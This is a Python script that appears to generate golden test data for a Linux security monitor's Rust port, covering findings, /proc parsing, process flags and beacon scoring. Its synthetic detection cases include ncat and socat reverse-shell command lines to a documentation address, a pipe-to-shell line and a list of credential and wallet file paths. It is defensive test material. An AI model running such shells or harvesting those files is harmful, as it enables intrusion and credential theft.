"""Write the golden files that hold Vigil 2 (Rust) to Vigil 1's (Python) behaviour.

Run from the repository root:   python3 vigil2/tests/golden/make_golden.py

Every input here is SYNTHETIC (written for these tests, or read from tests/fixtures/,
which is synthetic too). The outputs are whatever Vigil 1 computes for them today; the
Rust tests in vigil2/crates/*/tests/golden.rs must produce the same values.
"""

import json
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))

from vigil.core import attack, commands, finding, fixes, system, wording  # noqa: E402

OUT = Path(__file__).resolve().parent
OSR = ROOT / "tests" / "fixtures" / "os-release"

TITLES = [
    "beacon.py checks in with this PC every ~10 s", "Something happened.", "High entropy payload",
    "Starts at 10:30 every day", "Talks to 2001:db8::5 every hour", "Uses 100% of the CPU",
    "x" * 61, "x" * 60, "", "   ", "Low CV on this one", "cv", "a regex was used", "EDR says hi",
    "c2 server found", "Talks to ::1 now", "Talks to fe80::1%eth0", "At 12:30:45 it ran", "IOC list",
    "The payload's size", "Polls a server", "poll", "check-ins every hour", "stdev is small", "±5",
    "Runs ::ffff:192.0.2.1 here", "deadbeef:cafe::1 talks", "Ratio 1:2:3 seen", "a:b:c", "::",
    "Downloads and runs a script from a pastebin", "Exfil over DNS", "exfiltration over DNS",
    "Heuristic flags", "TTP match", "stdout shown", "Variation is low", "Coefficient high",
    "Firefox talks to Google", "Ends with question?", "Ends with dot .", "Läuft überall",
]
SENTENCES = [
    "It downloads install.sh from paste.example and runs it.", "The archive expands to 1.5 GB, e.g. from a tiny file.",
    "No full stop", "One. Two.", "Two sentences here. Another one.", "", "  ", "Is this a question?",
    "Wow!", "Ends with an etc. And more.", "See i.e. this one.", "Version 2.0 is out.",
    "Mr. Smith arrived.", "It reads ~/.ssh/id_rsa now.", "No. 5 is here.", "vs. them, it won.",
    "First sentence! Second sentence.", "Hello? World.", "lower. case next.", "The file a.tar.gz grew.",
    "Approx. 5 MB was sent.", "Done.  ", "It talks to example.com. Then stops.", "Mixed 3.5x faster.",
]
FIT = [
    ["x" * 70, "Short one"], ["y" * 80], ["memfd:payload runs from memory", "A program runs from memory only"],
    ["100% ready.service started", "A service started"], ["", None, "Only this"], ["Ends.", "z" * 61],
    ["Ends.", "Fine title"], ["a" * 59 + "é", "b"], ["c" * 61, "d" * 62],
]
SECONDS = [0, 3, 7, 12, 54, 55, 60, 89, 90, 100, 420, 3299, 3300, 3600, 5399, 5400, 7200, 36000, 86400]
KB = [0, 5, 999, 1000, 1499, 1500, 999999, 1000000, 1500000, 25e6]
PROGRAMS = [
    ["/usr/lib/librewolf/librewolf", None, None], ["/usr/bin/python3", "/usr/bin/python3 /home/a/.cache/upd.py", None],
    ["/opt/x/agent (deleted)", None, None], [None, "/usr/bin/firefox -P", None], [None, None, None],
    ["/usr/bin/node", "/usr/bin/node /srv/app/server.js --port 1", None], ["/usr/bin/bash", "/usr/bin/bash", None],
    ["/usr/bin/unknownthing", None, "Pretty"], ["/usr/bin/CODE", None, None], ["", "", ""],
    ["/usr/bin/perl", "/usr/bin/perl -e 1", None], ["/usr/bin/java", "/usr/bin/java -jar /x/y.jar", None],
]
OWNERS = ["AMAZON-02", "Google LLC", "HETZNER-AS", "Some Company", "ACME-NET", "acmecorp", "ExampleNet-AS64500",
          "", None, "MyISP-ASN", "Deutsche Telekom AG", "COMCAST-7922", "Mixed-Case-Co"]
HOSTS = ["www.example.com", "*.cdn.example.net", "a.very.long.subdomain.of.something.example.org", "Example.COM",
         "short.io", "a.b.c.d.e.f.g.h.example.com"]

COMMANDS = sorted(set([
    "sudo pacman -S syncthing", "sudo pacman -Rns foo", "pacman -Qo /usr/bin/x", "rpm -qf /usr/bin/x",
    "dpkg -S /usr/bin/x", "sudo systemctl disable --now foo.service", "systemctl --user stop bar.service",
    "systemctl status sshd", "systemctl list-timers --all", "sudo dnf install x", "sudo dnf remove x",
    "sudo zypper install x", "sudo apt remove x", "sudo xbps-remove -R x", "xbps-query -o /x", "doas apk add x",
    "doas apk del x", "apk info --who-owns /x", "sudo emerge --ask --depclean x", "equery belongs /x",
    "rm ~/.config/autostart/evil.desktop", "rm '/tmp/a b'", "sudoedit /etc/sudoers", "pkexec rm /etc/ld.so.preload",
    "sudo ufw deny out to 192.0.2.1", "sudo firewall-cmd --permanent --add-rich-rule='rule family=ipv4 reject'",
    "sudo nft add table inet vigil", "flatpak uninstall --unused", "sudo timedatectl set-ntp true",
    "gsettings set org.gnome.software download-updates false", "cat /etc/ssh/sshd_config", "ss -tnp",
    "journalctl -u foo --since today", "sha256sum ./x", "su -c whoami", "sudo -u nobody id",
    "nmcli networking connectivity", "sudo pacman -Syu", "sudo pacman -Qkk", "pacman -Qi bash",
    "rpm -qi bash", "sudo dpkg --verify", "sudo apt-get purge x", "dnf5 install y", "sudo apt autoremove",
    "unknowntool --flag value", "sudo nft delete table inet vigil", "ufw status", "sudo systemctl mask x",
    "sudo systemctl unmask x", "sudo systemctl restart y", "sudo systemctl reload y", "\"quoted cmd\" arg",
    "sudo flatpak uninstall --unused", "systemctl --user enable --now x.timer", "xbps-install -S x",
]))
src = "\n".join(p.read_text() for p in (ROOT / "vigil").rglob("*.py"))
for m in re.finditer(r'"((?:sudo|pkexec|doas|pacman|systemctl|rpm|dpkg|journalctl|nft|ufw|firewall-cmd|flatpak|'
                     r'zypper|dnf|apt|cat|rm|xbps-query|equery|apk|timedatectl|nmcli|gsettings) [^"{}]+)"', src):
    if not re.search(r"\b(is|are|the|lists|prints|changes|reads|deletes|mode)\b", m.group(1)):
        COMMANDS.append(m.group(1))
COMMANDS = sorted(set(COMMANDS))

# ---- findings ---------------------------------------------------------------------------
GOOD = dict(tool="pkg", check="pipe_to_shell", title="Downloads and runs a script from a pastebin",
            summary="The build downloads a script from pastebin.com and runs it.", severity="High",
            signals=[["curl output piped into sh", 0.9]], likely="Malware or a careless packager.",
            confidence="High", confidence_reason="Running downloaded code is rarely needed.",
            subject="/tmp/x/PKGBUILD", data="PKGBUILD line 12", when=1000.0)


def args(**kw):
    a = json.loads(json.dumps(GOOD))
    a.update(kw)
    return a


OPT_OK = dict(title="Remove it", what="Removes the package.", risk="admin",
              commands=["sudo pacman -Rns foo"], undo=["sudo pacman -S foo"])
OPT_STEPS = dict(title="Edit by hand", what="Open the file and delete the line.", risk="settings",
                 commands=[], undo=[], steps=["Open it", "Delete line 3"], undo_steps=["Put the line back"])
CHECK_OPT = dict(title="Look first", what="Shows the file.", risk="safe", commands=["cat /etc/ld.so.preload"])

MAKE = [
    ("good", args()),
    ("another wording, same id", args(title="Another wording of the same thing")),
    ("low without signals", args(subject="/other", severity="Low", signals=[])),
    ("signals sorted and clamped", args(signals=[["weak", 0.2, "a"], ["strong", 1.7, "b"], ["neg", -1, None],
                                                 ["mid", 0.555]])),
    ("ld_preload default attack", dict(tool="tasks", check="ld_preload", title="game has a library forced into it",
                                       summary="x.", severity="High", signals=[["x", 1]], when=1)),
    ("explicit attack", dict(tool="persist", check="content", title="A thing", summary="x.", severity="Info",
                             attack=["T1053.003", "T9999"], when=1)),
    ("evidence and iocs", args(evidence=[{"kind": "line", "value": "curl x | sh", "note": "line 12"},
                                         {"kind": "pid", "value": 4410}],
                               iocs=[{"type": "url", "value": "https://paste.example/raw/x"}],
                               technical=[{"label": "Line", "value": 12}], tags=["aur", "build"])),
    ("with fixes arch", args(fixes={"osr": "arch", "check": [CHECK_OPT], "fix": [OPT_OK, OPT_STEPS]})),
    ("with fixes unknown distro", args(fixes={"osr": "unknown", "check": [CHECK_OPT], "fix": [OPT_OK]})),
    ("unicode subject", args(subject="/home/ü/файл", title="Läuft überall")),
    ("medium", args(severity="Medium", confidence="Low", confidence_reason="")),
    ("info no likely", args(severity="Info", likely=None, signals=[])),
]
BROKEN = [
    ("title longer", args(title="x" * 61)), ("one sentence", args(summary="Two sentences here. Another one.")),
    ("severity", args(severity="Critical")), ("confidence", args(confidence="Certain")),
    ("signals", args(signals=[])), ("percent", args(title="Uses 100% of the CPU")),
    ("ipv6", args(title="Talks to 2001:db8::5 every hour")),
    ("bad indicator", args(iocs=[{"type": "colour", "value": "red"}])),
    ("bad indicator empty", args(iocs=[{"type": "url", "value": ""}])),
    ("fix without undo", args(fixes={"osr": "arch", "fix": [dict(OPT_OK, undo=[])]})),
    ("many at once", args(title="", summary="no stop", severity="Bad", confidence="Nope")),
    ("bad attack", args(attack=["X9999"])),
]


def build(a):
    a = json.loads(json.dumps(a))
    fx = a.pop("fixes", None)
    if fx:
        osr = system.os_release(str(OSR / fx["osr"]))
        mk = lambda o: fixes.option(o["title"], o["what"], o["risk"], o.get("commands", []), o.get("undo", []),
                                    steps=o.get("steps"), undo_steps=o.get("undo_steps"))
        a["fixes"] = fixes.panel(osr, check=[mk(o) for o in fx.get("check", [])], fix=[mk(o) for o in fx.get("fix", [])])
    a["signals"] = [tuple(s) for s in a.get("signals", [])]
    return finding.make(**a)


def errors_of(a):
    try:
        build(a)
    except finding.FindingError as e:
        return str(e)
    return None


data = {
    "_note": "SYNTHETIC inputs; outputs computed by Vigil 1 (Python). Regenerate with make_golden.py.",
    "title_problems": {t: wording.title_problems(t) for t in TITLES},
    "one_sentence": {s: wording.one_sentence(s) for s in SENTENCES},
    "fit_title": [{"in": c, "out": wording.fit_title(c)} for c in FIT],
    "every": {str(s): wording.every(s) for s in SECONDS},
    "span": {str(s): [wording.span(s), wording.span(s, short=True)] for s in SECONDS},
    "kb": [[n, wording.kb(n)] for n in KB],
    "friendly_program": [{"in": p, "out": wording.friendly_program(*p)} for p in PROGRAMS],
    "owner_name": [[o, wording.owner_name(o)] for o in OWNERS],
    "short_host": {h: wording.short_host(h) for h in HOSTS},
    "tokenize": {c: commands.tokenize(c) for c in COMMANDS},
    "legend": commands.LEGEND,
    "finding_id": [[t, c, s, finding.finding_id(t, c, s)] for t, c, s in
                   [("pkg", "pipe_to_shell", "/tmp/x/PKGBUILD"), ("net", "beacon", "firefox|192.0.2.1:443"),
                    ("tasks", "ld_preload", "4410"), ("files", "x", ""), ("persist", "c", "/home/ü/файл")]],
    "make": [{"name": n, "args": a, "out": build(a)} for n, a in MAKE],
    "broken": [{"name": n, "args": a, "error": errors_of(a)} for n, a in BROKEN],
    "attack_by_check": {f"{t}/{c}": attack.for_check(t, c) for t, c in attack.BY_CHECK},
    "attack_persist": [[g, k, p, attack.for_persist(g, k, p)] for g, k, p in
                       [("systemd", "", "/etc/systemd/system/x.service"), ("systemd", "", "/x/backup.timer"),
                        ("cron", "boot script", ""), ("shell", "package manager hook", ""), ("nope", "", "")]],
    "techniques": {k: list(v) for k, v in attack.TECHNIQUES.items()},
    "tactics": attack.TACTICS,
    "os_release": {p.name: [system.os_release(str(p)), system.family(system.os_release(str(p)))]
                   for p in sorted(OSR.iterdir()) if p.name != "README.md"},
    "owner_check": {n: fixes.owner_check("/usr/bin/x", system.family(system.os_release(str(OSR / n))))
                    for n in ("arch", "fedora", "opensuse", "ubuntu", "unknown")},
}
(OUT / "model.json").write_text(json.dumps(data, indent=1, ensure_ascii=False, sort_keys=True) + "\n")
print(f"wrote {OUT / 'model.json'}: {len(COMMANDS)} commands, {len(MAKE)} findings, {len(BROKEN)} broken")


# ---- /proc: the Network collector on the synthetic fixture ------------------------------
# User names come from the machine's passwd file, which differs between machines, so both
# sides use the same made-up rule here: uid N is called "user-N" (root is "root").
import tempfile  # noqa: E402

from tests import helpers  # noqa: E402
from vigil.net import collector  # noqa: E402

collector.username = lambda uid: "root" if uid == 0 else f"user-{uid}"
collector.username.cache_clear = lambda: None


def proc_snapshot(viewer, blocked):
    with tempfile.TemporaryDirectory() as tmp:
        root = helpers.make_proc(tmp)
        if blocked:
            with helpers.non_root_view(root):
                snap = collector.snapshot(root, now=1000.0, viewer_uid=viewer)
        else:
            snap = collector.snapshot(root, now=1000.0, viewer_uid=viewer)
    for k in ("taken_at", "proc_root", "byte_counts", "hidepid"):
        snap.pop(k)
    snap["processes"] = {str(k): v for k, v in snap["processes"].items()}
    snap["unreadable_by_uid"] = {str(k): v for k, v in snap["unreadable_by_uid"].items()}
    return snap


identities = [
    [None, [], "kthreadd"], ["/usr/bin/python3.11", ["python3", "/home/a/x.py", "-v"], "python3"],
    ["/usr/bin/python3", ["python3", "-m", "http.server"], "python3"], ["/usr/bin/python3", ["python3", "-c", "x"], "python3"],
    ["/usr/bin/java", ["java", "-jar", "/opt/app.jar"], "java"], ["/opt/x (deleted)", ["/opt/x"], "x"],
    ["/usr/bin/bash", ["bash"], "bash"], ["/usr/bin/node", ["node", "--inspect", "srv.js"], "node"],
    [None, ["/usr/bin/foo", "a"], "foo"], ["/usr/bin/python3", ["python3", "-m"], "python3"],
]
addresses = ["0100007F:0277", "00000000:0016", "0000000000000000FFFF00000100007F:0050",
             "B80D0120000000000000000001000000:01BB", "00000000000000000000000001000000:1F90",
             "2E01A8C0:C350", "0101A8C0:0035", "FFFFFFFF:0000", "000080FE00000000FF005450B6AD1DFE:0000"]
proc_data = {
    "_note": "SYNTHETIC: Vigil 1's collector on tests/fixtures/proc. Regenerate with make_golden.py.",
    "root": proc_snapshot(0, False),
    "user1000": proc_snapshot(1000, True),
    "program_identity": [[e, c, comm, list(collector.program_identity(e, c, comm))] for e, c, comm in identities],
    "decode_address": [[a, list(collector.decode_address(a, "little"))] for a in addresses],
    "decode_address_bad": [b for b in ["0100007F", "01007F:0277", "ZZZZZZZZ:0050", "0100007F:XYZ"]],
    "scope_of": {ip: collector.scope_of(ip) for ip in ["127.0.0.1", "10.1.2.3", "192.0.2.1", "8.8.8.8", "::1", "fe80::1",
                                                         "ff02::fb", "0.0.0.0", "::", "100.64.1.1", "fd00::1",
                                                         "2001:db8::1", "2606:4700::1111", "224.0.0.251", "169.254.1.1",
                                                         "172.16.5.4", "172.32.0.1", "255.255.255.255"]},
}
(OUT / "proc.json").write_text(json.dumps(proc_data, indent=1, ensure_ascii=False, sort_keys=True) + "\n")
print(f"wrote {OUT / 'proc.json'}: {len(proc_data['root']['sockets'])} sockets, "
      f"{len(proc_data['root']['processes'])} processes")


# ---- Processes: Vigil 1's process checks (tasks/procs.py flags, tasks/secrets.py) ---------
# Inputs are the synthetic fixture (read by Vigil 1's own snapshot, with no package database
# and no hashing so the result does not depend on this machine) and SYNTHETIC hand-made
# processes that reach every rule. Only the fields the checks read are kept.
from vigil.tasks import procs as TP  # noqa: E402
from vigil.tasks import secrets as TS  # noqa: E402

FACT_KEYS = ("pid", "ppid", "comm", "exe", "exe_deleted", "cmdline", "name", "kernel", "path", "exists_now",
             "package", "package_db", "ld", "sockets", "secrets")


class NoPackages:
    kind = None

    def owner(self, path):
        return None


def facts(p):
    out = {k: p.get(k) for k in FACT_KEYS}
    out["sockets"] = [{k: s.get(k) for k in ("kind", "local_ip", "local_port")} for s in p.get("sockets") or []]
    out["secrets"] = list(p.get("secrets") or [])
    return out


with tempfile.TemporaryDirectory() as tmp:
    proc_root = helpers.make_proc(tmp)
    empty_root = Path(tmp) / "empty"
    empty_root.mkdir()
    tsnap = TP.snapshot(proc_root, pkgfiles=NoPackages(), hasher=lambda *a: None, now=1000.0,
                        home="/home/alice", root=str(empty_root))
fixture_procs = {pid: facts(p) for pid, p in tsnap["processes"].items()}
fixture_flags = {str(pid): [list(f) for f in TP.flags(p, tsnap["processes"], "/home/alice")]
                 for pid, p in tsnap["processes"].items()}


def P(pid, exe, cmdline, ppid=1, comm=None, **kw):
    path = (exe or "").removesuffix(" (deleted)") or None
    base = {"pid": pid, "ppid": ppid, "comm": comm or (path or "").rsplit("/", 1)[-1][:15] or "x", "exe": exe,
            "exe_deleted": bool(exe and exe.endswith(" (deleted)")), "cmdline": cmdline,
            "name": (path or "x").rsplit("/", 1)[-1], "kernel": False, "path": path, "exists_now": False,
            "package": None, "package_db": None, "ld": {}, "sockets": [], "secrets": []}
    base.update(kw)
    return base


def secret(kind, path):
    return {"kind": kind, "label": TS.KINDS[kind][0], "path": path}


H = "/home/alice"
browser = P(100, "/usr/lib/firefox/firefox", ["/usr/lib/firefox/firefox"], comm="firefox")
nginx = P(200, "/usr/sbin/nginx", ["nginx: worker process"], comm="nginx")
case_procs = [
    P(1, "/usr/lib/systemd/systemd", ["/sbin/init"], ppid=0, comm="systemd"),
    browser, nginx,
    P(300, "/memfd:payload (deleted)", ["x"], comm="x"),
    P(301, "/opt/tool/bin/tool (deleted)", ["/opt/tool/bin/tool"]),
    P(302, "/usr/bin/vim (deleted)", ["vim"], exists_now=True, package="vim"),
    P(303, "/tmp/.x/agent", ["/tmp/.x/agent"]),
    P(304, f"{H}/.cache/upd/upd", ["upd"]),
    P(305, f"{H}/Downloads/App.AppImage", ["App.AppImage"]),
    P(306, f"{H}/.hidden/bin/miner", ["miner"]),
    P(307, f"{H}/.local/bin/tool", ["tool"]),
    P(308, f"{H}/.cargo/bin/rg", ["rg"]),
    P(309, "/usr/bin/sleep", ["sleep", "9"], ld={"LD_PRELOAD": "/tmp/libhook.so", "LD_LIBRARY_PATH": "/opt/x"}),
    P(310, "/usr/bin/sleep", ["sleep", "9"], ld={"LD_AUDIT": "  "}),
    P(311, "/usr/bin/bash", ["bash", "-c", "id"], ppid=100, comm="bash"),
    P(312, "/usr/bin/bash", ["sh", "-c", "xdg-open https://example.org"], ppid=100, comm="bash"),
    P(313, "/usr/bin/python3.12", ["python3", "-c", "print(1)"], ppid=200, comm="python3"),
    P(314, "/usr/bin/curl", ["curl", "https://example.org"], ppid=100, comm="curl"),
    P(315, "/home/alice/.local/share/dbus-daemon", ["dbus-daemon", "--session"], comm="dbus-daemon"),
    P(316, "/usr/bin/tor", ["dbus-daemon"], comm="dbus-daemon", package_db="pacman"),
    P(317, "/usr/bin/dbus-daemon", ["dbus-daemon"], comm="dbus-daemon", package_db="pacman"),
    P(318, "/usr/local/bin/kw", ["[kworker/0:1]"], comm="kw"),
    P(319, "/usr/bin/ncat", ["ncat", "203.0.113.5", "4444", "-e", "/bin/bash"], comm="ncat"),
    P(320, "/usr/bin/socat", ["socat", "tcp:203.0.113.5:4444", "exec:/bin/sh"], comm="socat"),
    P(321, "/usr/bin/python3.12", ["python3", "/tmp/steal.py"], comm="python3",
      secrets=[secret("browser_passwords", f"{H}/.mozilla/firefox/p/logins.json"),
               secret("ssh_key", f"{H}/.ssh/id_ed25519")]),
    P(322, "/usr/bin/mystery", ["mystery"], comm="mystery", secrets=[secret("cloud_creds", f"{H}/.aws/credentials")]),
    P(323, "/usr/bin/mystery2", ["mystery2"], comm="mystery2", package_db="rpm",
      secrets=[secret("wallet", f"{H}/.electrum/wallets/default_wallet")]),
    P(324, "/usr/bin/nvim", ["nvim", f"{H}/.aws/credentials"], comm="nvim",
      secrets=[secret("cloud_creds", f"{H}/.aws/credentials")]),
    P(325, "/opt/google/chrome/chrome_crashpad_handler", ["chrome_crashpad_handler"], comm="chrome_crashpa",
      secrets=[secret("browser_cookies", f"{H}/.config/google-chrome/Default/Cookies")]),
    P(326, "/usr/bin/restic", ["restic", "backup"], comm="restic", secrets=[secret("ssh_key", f"{H}/.ssh/id_rsa")]),
    P(327, "/tmp/srv", ["/tmp/srv"], sockets=[{"kind": "listen", "local_ip": "0.0.0.0", "local_port": 8080}]),
    P(328, f"{H}/Downloads/srv", ["srv"], sockets=[{"kind": "listen", "local_ip": "127.0.0.1", "local_port": 9}]),
    P(329, None, [], ppid=2, comm="kworker/0:1", kernel=True),
    P(330, "/usr/bin/bash", ["bash"], ppid=999, comm="bash"),
]
case_map = {p["pid"]: p for p in case_procs}
case_flags = {str(p["pid"]): [list(f) for f in TP.flags(p, case_map, H)] for p in case_procs}
paths = [f"{H}/.ssh/id_ed25519", f"{H}/.ssh/id_ed25519.pub", f"{H}/.ssh/known_hosts", f"{H}/.ssh/deploy_key",
         f"{H}/.ssh/aws.pem", f"{H}/.gnupg/private-keys-v1.d/AB.key", f"{H}/.gnupg/secring.gpg",
         f"{H}/.gnupg/pubring.kbx", f"{H}/.config/chromium/Default/Login Data", f"{H}/.mozilla/firefox/x/key4.db",
         f"{H}/.mozilla/firefox/x/cookies.sqlite", f"{H}/.config/BraveSoftware/Default/Network/Cookies",
         f"{H}/.config/chromium/Local State", f"{H}/.config/chromium/Default/Web Data", f"{H}/vault.kdbx",
         f"{H}/old.kdb", f"{H}/x.psafe3", f"{H}/.local/share/keyrings/login.keyring",
         f"{H}/.local/share/kwalletd/kdewallet.kwl", f"{H}/.config/discord/Local Storage/leveldb/000.ldb",
         f"{H}/.config/vesktop/Local Storage/leveldb/1.log", f"{H}/.bitcoin/wallet.dat",
         f"{H}/.bitcoin/wallets/w1/wallet.dat", f"{H}/.electrum/wallets/default", f"{H}/.ethereum/keystore/UTC--x",
         f"{H}/.monero/x", f"{H}/.config/Ledger Live/app.json", f"{H}/.aws/credentials", f"{H}/.aws/config",
         f"{H}/.kube/config", f"{H}/.docker/config.json", f"{H}/.netrc", f"{H}/.git-credentials", f"{H}/.pgpass",
         f"{H}/.config/gcloud/credentials.db", f"{H}/.config/gh/hosts.yml", f"{H}/.azure/accessTokens.json",
         f"{H}/notes.txt", "/etc/passwd", f"{H}/.config/Exodus/exodus.wallet/seed.seco", f"{H}/.sparrow/wallets/w"]
(OUT / "tasks.json").write_text(json.dumps({
    "_note": "SYNTHETIC: Vigil 1's process checks on tests/fixtures/proc and hand-made processes. "
             "Regenerate with make_golden.py.",
    "home": H,
    "fixture": {"procs": {str(k): v for k, v in fixture_procs.items()}, "flags": fixture_flags},
    "cases": {"procs": {str(p["pid"]): p for p in case_procs}, "flags": case_flags},
    "classify": {p: TS.classify(p) for p in paths},
}, indent=1, ensure_ascii=False, sort_keys=True) + "\n")
print(f"wrote {OUT / 'tasks.json'}: {len(fixture_procs)} fixture processes, {len(case_procs)} cases")


# ---- Network: Vigil 1's scoring and alert wording (net/scoring.py, net/wording.py) ---------
# SYNTHETIC connection histories. Times are printed as clock times, so this part runs in UTC
# (the Rust side is given a UTC offset of 0).
import os as _os  # noqa: E402
import random  # noqa: E402
import time as _time  # noqa: E402

_os.environ["TZ"] = "UTC"
_time.tzset()
from vigil.net import scoring as NS  # noqa: E402
from vigil.net import wording as NW  # noqa: E402

rng = random.Random(7)
T0 = 1_790_000_000.0
NOW = T0 + 6 * 3600


def series(interval, n, jitter=0.0, start=T0, skip=(), pause_after=None, pause=0.0):
    out, t = [], start
    for i in range(n):
        if i not in skip:
            out.append(round(t + rng.uniform(-jitter, jitter), 3))
        t += interval
        if pause_after is not None and i == pause_after:
            t += pause
    return out


SERIES = {
    "steady-60": series(60, 40, 0.5), "steady-300": series(300, 30, 3),
    "jitter-15pct": series(120, 30, 18), "jitter-30pct": series(120, 30, 36),
    "noisy": series(100, 30, 60), "missed": series(60, 40, 0.5, skip={5, 6, 17, 30}),
    "pause": series(60, 30, 0.5, pause_after=14, pause=5000), "too-few": series(60, 5),
    "too-fast": series(4, 60, 0.2), "bursty": sorted(series(90, 20, 1) + series(90, 20, 1, start=T0 + 0.5)),
}
beacon = {k: NS.beacon_stats(v, 2.0) for k, v in SERIES.items()}


def conns_of(times, closed_after=1.0, start_id=1):
    return [{"id": start_id + i, "opened_at": t, "closed_at": t + closed_after, "last_seen": t + closed_after,
             "bytes_sent": None, "bytes_recv": None, "local_port": 40000 + i} for i, t in enumerate(times)]


beacon_f = {k: NS.beacon_findings(conns_of(v), 2.0, "tcp 203.0.113.7:443") for k, v in SERIES.items()}
LONG = {
    "short": [{"id": 1, "opened_at": NOW - 600, "closed_at": None, "local_port": 5}],
    "open-2h": [{"id": 2, "opened_at": NOW - 7200, "closed_at": None, "local_port": 6}],
    "closed-9h": [{"id": 3, "opened_at": NOW - 40000, "closed_at": NOW - 7000, "local_port": 7}],
    "baseline": [{"id": 4, "opened_at": T0 - 100, "closed_at": None, "local_port": 8}],
}
long_f = {k: NS.long_connection_finding(v, NOW, T0) for k, v in LONG.items()}
LOC = {
    "tmp": ({"exe": "/tmp/x/agent", "pid": 7}, "/tmp/x/agent"),
    "hidden": ({"exe": "/home/a/.hidden/bin/m", "pid": 8}, "/home/a/.hidden/bin/m"),
    "hidden-ok": ({"exe": "/home/a/.local/bin/tool", "pid": 9}, "/home/a/.local/bin/tool"),
    "script-tmp": ({"exe": "/usr/bin/python3.12", "pid": 10}, "/usr/bin/python3.12 /tmp/s.py"),
    "deleted": ({"exe": "/usr/bin/x (deleted)", "pid": 11, "exe_deleted": True}, "/usr/bin/x"),
    "plain": ({"exe": "/usr/bin/curl", "pid": 12}, "/usr/bin/curl"),
}
loc_f = {k: NS.location_findings(i, key) for k, (i, key) in LOC.items()}
PAIRS = [
    {"program": "/usr/bin/curl", "ip": "127.0.0.1", "port": 80, "proto": "tcp", "direction": "out"},
    {"program": "/usr/sbin/chronyd", "ip": "162.159.200.1", "port": 123, "proto": "udp", "direction": "out"},
    {"program": "/usr/bin/x", "ip": "203.0.113.4", "port": 123, "proto": "udp", "direction": "out"},
    {"program": "/usr/bin/x", "ip": "192.168.1.1", "port": 53, "proto": "udp", "direction": "out"},
    {"program": "/usr/bin/x", "ip": "8.8.8.8", "port": 53, "proto": "udp", "direction": "out"},
    {"program": "/usr/sbin/NetworkManager", "ip": "34.107.221.82", "port": 80, "proto": "tcp", "direction": "out"},
    {"program": "/usr/bin/NetworkManager", "ip": "34.107.221.82", "port": 80, "proto": "tcp", "direction": "in"},
    {"program": "/usr/lib64/packagekitd", "ip": "1.2.3.4", "port": 443, "proto": "tcp", "direction": "out"},
    {"program": "/usr/lib/apt/methods/http", "ip": "1.2.3.4", "port": 80, "proto": "tcp", "direction": "out"},
    {"program": "/usr/bin/avahi", "ip": "224.0.0.251", "port": 5353, "proto": "udp", "direction": "out"},
    {"program": "/tmp/NetworkManager", "ip": "34.107.221.82", "port": 80, "proto": "tcp", "direction": "out"},
]
USER_RULES = [
    {"id": "user-1", "program": "/usr/bin/x", "ip": "8.8.0.0/16", "reason": "test", "enabled": True},
    {"id": "user-2", "program": "*", "ip": "*", "port": 443, "proto": "tcp", "reason": "test", "enabled": True},
    {"id": "user-3", "program": "/usr/bin/[xy]", "ip": "lan", "reason": "test", "enabled": True},
    {"id": "user-4", "program": "/usr/bin/?", "ip": "2001:db8::/32", "reason": "test", "enabled": True},
]
rules = [dict(r, enabled=True) for r in NS.BUILTIN_RULES] + USER_RULES
PAIRS.append({"program": "/usr/bin/y", "ip": "2001:db8::5", "port": 9, "proto": "tcp", "direction": "out"})
rule_hits = [next((r["id"] for r in rules if NS.rule_matches(r, p)), None) for p in PAIRS]

# Whole pairs: score_pair with a context, then the alert's words (no names, places or
# known-service matches: Vigil 2 has no offline databases yet).
scorer = NS.Scorer(None, None, poll_interval=2.0)
PROGS = {
    "/tmp/.x/agent": {"key": "/tmp/.x/agent", "name": "agent", "first_outbound": T0 + 3600,
                      "info": json.dumps({"exe": "/tmp/.x/agent", "pid": 7000})},
    "/usr/bin/syncd": {"key": "/usr/bin/syncd", "name": "syncd", "first_outbound": T0 - 50000,
                       "info": json.dumps({"exe": "/usr/bin/syncd", "pid": 400})},
    "/usr/bin/python3.12 /home/a/.cache/u.py": {"key": "/usr/bin/python3.12 /home/a/.cache/u.py",
                                                "name": "u.py (python3.12)", "first_outbound": T0 + 100,
                                                "info": json.dumps({"exe": "/usr/bin/python3.12", "pid": 5120})},
    "/usr/bin/ssh": {"key": "/usr/bin/ssh", "name": "ssh", "first_outbound": T0 - 99999,
                     "info": json.dumps({"exe": "/usr/bin/ssh", "pid": 6000})},
}
DESTS = {"203.0.113.10": {"ip": "203.0.113.10", "scope": "internet", "first_seen": T0 + 3600},
         "198.51.100.20": {"ip": "198.51.100.20", "scope": "internet", "first_seen": T0 - 9999},
         "93.184.216.34": {"ip": "93.184.216.34", "scope": "internet", "first_seen": T0 + 200},
         "192.168.1.5": {"ip": "192.168.1.5", "scope": "lan", "first_seen": T0 - 10}}
CTX = {"now": NOW, "baseline": T0, "programs": PROGS, "destinations": DESTS,
       "prevalence": {"203.0.113.10": (1, 30), "198.51.100.20": (3, 90), "93.184.216.34": (1, 3),
                      "192.168.1.5": (1, 2)}}
CASES = [
    ("agent-beacon", ("/tmp/.x/agent", "203.0.113.10", 4444, "tcp", "out"),
     conns_of(series(60, 40, 0.5, start=T0 + 3600))),
    ("syncd-timer", ("/usr/bin/syncd", "198.51.100.20", 443, "tcp", "out"), conns_of(series(300, 30, 3))),
    ("script-http", ("/usr/bin/python3.12 /home/a/.cache/u.py", "93.184.216.34", 80, "tcp", "out"),
     conns_of(series(120, 25, 2, start=T0 + 200))),
    ("ssh-long", ("/usr/bin/ssh", "192.168.1.5", 22, "tcp", "out"),
     [{"id": 1, "opened_at": T0 - 100, "closed_at": None, "last_seen": NOW, "bytes_sent": None,
       "bytes_recv": None, "local_port": 50000}]),
    ("ssh-in", ("/usr/bin/ssh", "203.0.113.10", 22, "tcp", "in"),
     [{"id": 1, "opened_at": NOW - 9000, "closed_at": None, "last_seen": NOW, "bytes_sent": None,
       "bytes_recv": None, "local_port": 22}]),
]
pair_out = {}
for name, key, conns in CASES:
    pair, score, fs = scorer.score_pair(key, conns, dict(CTX))
    prog = PROGS[key[0]]
    ctx = {"program": key[0], "name": prog["name"], "hidden": None, "info": json.loads(prog["info"]),
           "ip": key[1], "port": key[2], "proto": key[3], "direction": key[4], "score": score, "findings": fs,
           "first_raised": NOW, "hosts": [], "geo": None, "scope": pair["scope"], "service": None, "poll": 2.0}
    view = NW.present(ctx, now=NOW)
    pair_out[name] = {"key": list(key), "conns": conns, "pair": pair, "score": score, "findings": fs,
                      "view": {k: view[k] for k in ("title", "severity", "who", "to")},
                      "explain": {k: view["explain"][k] for k in ("summary", "signals", "why", "confidence")}}
(OUT / "net.json").write_text(json.dumps({
